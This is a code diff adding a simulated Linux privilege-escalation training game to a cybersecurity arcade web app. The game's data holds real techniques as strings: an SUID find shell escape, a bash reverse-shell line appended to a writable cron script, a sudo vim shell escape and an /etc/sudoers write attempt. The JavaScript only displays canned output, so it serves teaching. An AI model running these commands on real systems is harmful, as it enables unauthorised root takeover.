@@ -1338,3 +1338,177 @@ function updateCidrHUD() {
     if (compEl) compEl.textContent = `${CidrGame.ticketIndex} / ${CidrGame.tickets.length}`;
     if (badgeEl) badgeEl.textContent = `${usagePct}% UTILIZED`;
 }
+
+
+// ── 8. GAME 5: PRIVESC FLOOR BY FLOOR IMPLEMENTATION ──
+const PrivescTower = {
+    floor: 0,
+    termHistory: [],
+
+    floors: [
+        {
+            floor: 0,
+            user: 'www-data',
+            uid: 33,
+            badge: 'www-data (Restricted)',
+            prompt: 'www-data@pwnbox-srv:~$ ',
+            intro: `[PWNBOX SHELL INITIALIZED]\nSession established via RCE web-shell on Port 80.\nCurrent identity: uid=33(www-data) gid=33(www-data).\nObjective: Find a path to escalate to local user 'cadet'.\n`,
+            commands: {
+                'id': `uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
+                'uname -a': `Linux pwnbox-srv 6.8.0-generic #42-Ubuntu SMP x86_64 GNU/Linux (Kernel up-to-date, no DirtyPipe/OverlayFS)`,
+                'find / -perm -4000 2>/dev/null': `/usr/lib/openssh/ssh-keysign\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find [OWNER: cadet, SUID: -rwsr-xr-x] <-- ANOMALOUS SUID BINARY DETECTED!`,
+                'echo "cadet ALL=(ALL) ALL" >> /etc/sudoers': `bash: /etc/sudoers: Permission denied (uid 33 cannot write to root-owned files)`
+            },
+            exploitCmd: 'find . -exec /bin/sh -p \\; -quit',
+            exploitSuccess: `[GTFOBINS EXECUTION] Spawning subshell with SUID privileges of binary owner...\nSuccess! SUID bit on /usr/bin/find executed shell as cadet.\nElevated to FLOOR 1: cadet (uid=1000)!`,
+            options: [
+                { label: '🔍 Run: find / -perm -4000 (SUID Scan)', cmd: 'find / -perm -4000 2>/dev/null', isExploit: false },
+                { label: 'ℹ️ Run: uname -a (Kernel Check)', cmd: 'uname -a', isExploit: false },
+                { label: '⚡ Exploit: SUID find -exec /bin/sh -p (GTFOBins)', cmd: 'find . -exec /bin/sh -p \\; -quit', isExploit: true },
+                { label: '🚫 Abuse: echo to /etc/sudoers', cmd: 'echo "cadet ALL=(ALL) ALL" >> /etc/sudoers', isExploit: false }
+            ]
+        },
+        {
+            floor: 1,
+            user: 'cadet',
+            uid: 1000,
+            badge: 'cadet (Local User)',
+            prompt: 'cadet@pwnbox-srv:~$ ',
+            intro: `[FLOOR 1 ACCESSED: CADET]\nYou now possess local shell access.\nObjective: Identify automated scheduled tasks to pivot to user 'developer'.\n`,
+            commands: {
+                'id': `uid=1000(cadet) gid=1000(cadet) groups=1000(cadet)`,
+                'cat /etc/crontab': `# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n* * * * * developer /opt/scripts/sync_repo.sh <-- RUNS EVERY MINUTE AS DEVELOPER!`,
+                'ls -la /opt/scripts/sync_repo.sh': `-rwxrwxrwx 1 developer developer 48 May 12 14:02 /opt/scripts/sync_repo.sh (WORLD WRITABLE!)`,
+                'su developer': `su: Authentication failure (password unknown)`
+            },
+            exploitCmd: 'echo "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" >> /opt/scripts/sync_repo.sh',
+            exploitSuccess: `[CRON HIJACKING SUCCESS] Wrote reverse shell payload into world-writable /opt/scripts/sync_repo.sh...\nWaiting for cron daemon tick (60s)...\n[+] Cron job executed by developer!\nElevated to FLOOR 2: developer (uid=1001)!`,
+            options: [
+                { label: '🔍 Run: cat /etc/crontab (Check Scheduled Tasks)', cmd: 'cat /etc/crontab', isExploit: false },
+                { label: '🔍 Run: ls -la /opt/scripts/sync_repo.sh', cmd: 'ls -la /opt/scripts/sync_repo.sh', isExploit: false },
+                { label: '⚡ Exploit: Inject Shell Payload into Writable Cron Script', cmd: 'echo "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" >> /opt/scripts/sync_repo.sh', isExploit: true },
+                { label: '🚫 Guess: su developer', cmd: 'su developer', isExploit: false }
+            ]
+        },
+        {
+            floor: 2,
+            user: 'developer',
+            uid: 1001,
+            badge: 'developer (Dev Suite)',
+            prompt: 'developer@pwnbox-srv:~$ ',
+            intro: `[FLOOR 2 ACCESSED: DEVELOPER]\nYou have compromised the lead developer account.\nObjective: Audit sudo privileges to claim the ultimate prize: root (UID 0).\n`,
+            commands: {
+                'id': `uid=1001(developer) gid=1001(developer) groups=1001(developer),27(sudo)`,
+                'sudo -l': `Matching Defaults entries for developer on pwnbox-srv:\n    env_reset, mail_badpass, secure_path=...\n\nUser developer may run the following commands on pwnbox-srv:\n    (root) NOPASSWD: /usr/bin/vim /var/log/nginx/access.log`,
+                'cat /etc/shadow': `cat: /etc/shadow: Permission denied (read permission restricted to root:shadow)`
+            },
+            exploitCmd: "sudo vim -c ':!/bin/sh' /var/log/nginx/access.log",
+            exploitSuccess: `[VIM SHELL BREAKOUT] Executing Vim as root with shell escape argument ':!/bin/sh'...\nSpawning unconfined interactive shell...\nwhoami: root (uid=0 gid=0)!\nCONGRATULATIONS: You have reached the ROOFTOP PENTHOUSE!`,
+            options: [
+                { label: '🔍 Run: sudo -l (Inspect Sudo Privileges)', cmd: 'sudo -l', isExploit: false },
+                { label: '🚫 Run: cat /etc/shadow', cmd: 'cat /etc/shadow', isExploit: false },
+                { label: '⚡ Exploit: sudo vim -c \':!/bin/sh\' (Vim Shell Escape)', cmd: "sudo vim -c ':!/bin/sh' /var/log/nginx/access.log", isExploit: true }
+            ]
+        }
+    ]
+};
+
+function initPrivescTower() {
+    PrivescTower.floor = 0;
+    loadPrivescFloor(0);
+}
+
+function loadPrivescFloor(floorNum) {
+    PrivescTower.floor = floorNum;
+    const f = PrivescTower.floors[floorNum];
+
+    // Update Elevator Cards
+    for (let i = 0; i <= 3; i++) {
+        const card = document.getElementById(`floorCard${i}`);
+        if (!card) continue;
+        card.className = 'privesc-floor-card';
+        if (i < floorNum) {
+            card.classList.add('unlocked');
+        } else if (i === floorNum) {
+            card.classList.add('unlocked', 'active');
+        }
+    }
+
+    // Update HUD
+    const rankEl = document.getElementById('privescRankVal');
+    const floorEl = document.getElementById('privescFloorVal');
+    const uidEl = document.getElementById('privescUidVal');
+    const termPromptTitle = document.getElementById('privescTermPromptTitle');
+
+    if (rankEl) rankEl.textContent = f.user;
+    if (floorEl) floorEl.textContent = `${floorNum} / 3`;
+    if (uidEl) uidEl.textContent = f.uid;
+    if (termPromptTitle) termPromptTitle.textContent = f.prompt;
+
+    // Terminal Screen
+    const screen = document.getElementById('privescScreen');
+    if (screen) {
+        screen.innerHTML = f.intro;
+    }
+
+    // Render action buttons
+    const actionsBox = document.getElementById('privescActionsContainer');
+    if (actionsBox) {
+        actionsBox.innerHTML = '';
+        f.options.forEach(opt => {
+            const btn = document.createElement('button');
+            btn.className = `pg-btn ${opt.isExploit ? 'pg-btn-allow' : 'pg-btn-drop'}`;
+            btn.style.padding = '8px 14px';
+            btn.style.fontSize = '0.75rem';
+            btn.innerHTML = `<span>${opt.label}</span>`;
+            btn.onclick = () => runPrivescAction(opt);
+            actionsBox.appendChild(btn);
+        });
+    }
+}
+
+function runPrivescAction(opt) {
+    const f = PrivescTower.floors[PrivescTower.floor];
+    const screen = document.getElementById('privescScreen');
+    if (!screen) return;
+
+    screen.innerHTML += `\n<span style="color:#fcee0a;">${f.prompt}</span> ${opt.cmd}\n`;
+
+    if (opt.isExploit) {
+        CyberAudio.success();
+        screen.innerHTML += `<span style="color:#22c55e;">${f.exploitSuccess}</span>\n`;
+        addArcadeXp(50);
+        screen.scrollTop = screen.scrollHeight;
+
+        if (PrivescTower.floor + 1 < PrivescTower.floors.length) {
+            setTimeout(() => {
+                loadPrivescFloor(PrivescTower.floor + 1);
+            }, 1200);
+        } else {
+            // Penthouse reached
+            setTimeout(() => {
+                const card = document.getElementById('floorCard3');
+                if (card) card.classList.add('unlocked', 'active');
+                document.getElementById('privescRankVal').textContent = 'root';
+                document.getElementById('privescFloorVal').textContent = '3 / 3 (MAX)';
+                document.getElementById('privescUidVal').textContent = '0 (ROOT)';
+                screen.innerHTML += `\n<span style="color:#a855f7; font-weight:bold;">👑 [ROOT PENTHOUSE SECURED] Tower fully compromised! Full kernel ring 0 authority achieved.</span>\n`;
+                screen.scrollTop = screen.scrollHeight;
+
+                const actionsBox = document.getElementById('privescActionsContainer');
+                if (actionsBox) {
+                    actionsBox.innerHTML = `
+                        <button class="pg-btn pg-btn-allow" style="padding: 10px 20px; font-size: 0.8rem;" onclick="initPrivescTower()">
+                            <span>↺ REPLAY PRIVESC TOWER</span>
+                        </button>
+                    `;
+                }
+            }, 1200);
+        }
+    } else {
+        CyberAudio.blip();
+        const output = f.commands[opt.cmd] || 'Command returned status 0.';
+        screen.innerHTML += `${output}\n`;
+        screen.scrollTop = screen.scrollHeight;
+    }
+}
